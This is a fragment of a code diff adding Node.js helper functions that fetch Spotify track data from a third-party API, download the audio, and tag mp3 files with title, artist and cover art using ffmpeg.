+  const data = await apiGet(`${SPOTIFY_BASE}/faa/aio`, { url });
+
+  if (!data || !data.status || !data.result) {
+    throw new Error("Failed to fetch Spotify track info");
+  }
+
+  const r = data.result;
+  const audio = (r.downloads || []).find((d) => d.type === "audio");
+
+  return {
+    title: r.title,
+    thumbnail: r.thumbnail,
+    downloadUrl: audio?.url || null,
+  };
+}
+
+async function downloadSpotifyTrack(spotifyUrl) {
+  const track = await spotifyTrack(spotifyUrl);
+  if (!track.downloadUrl) throw new Error("No downloadable audio found");
+
+  const filePath = await downloadFile(track.downloadUrl, `${track.title}.mp3`);
+  return {
+    path: filePath,
+    title: track.title,
+    info: { channel: { name: null }, thumbnail: track.thumbnail },
+  };
+}
+
+/**
+ * Tags an mp3 with title / artist / cover art using ffmpeg.
+ */
+async function convertM4aToMp3(audioPath, meta = {}) {
+  const { title, artist, thumbnail } = meta;
+  const outputPath = audioPath.replace(/\.[^.]+$/, "") + "_tagged.mp3";
+
+  let coverPath = null;
+  if (thumbnail) {
+    try {
+      coverPath = await downloadFile(thumbnail, "cover.jpg");
+    } catch (_) {
+      coverPath = null;
+    }
+  }
+
+  const args = ["-y", "-i", audioPath];
+  if (coverPath) args.push("-i", coverPath);
+  args.push("-map", "0:a");
+  if (coverPath) args.push("-map", "1:0", "-c:v", "mjpeg", "-disposition:v", "attached_pic");
+  args.push("-c:a", "copy", "-id3v2_version", "3");
+  if (title) args.push("-metadata", `title=${title}`);
+  if (artist) args.push("-metadata", `artist=${artist}`);
+  args.push(outputPath);
+
+  await new Promise((resolve, reject) => {
+    execFile("ffmpeg", args, (error) => {
+      if (error) return reject(error);
+      resolve();
+    });
+  });
+
+  if (fs.existsSync(audioPath)) fs.unlinkSync(audioPath);
+  if (coverPath && fs.existsSync(coverPath)) fs.unlinkSync(coverPath);
+
+  return outputPath;
+}
+
+module.exports = {
+  searchYoutube,
+  getVideoInfo,
+  downloadVideo,
+  downloadAudio,
+  convertM4aToMp3,
+  spotifyTrack,
+  downloadSpotifyTrack,
+};
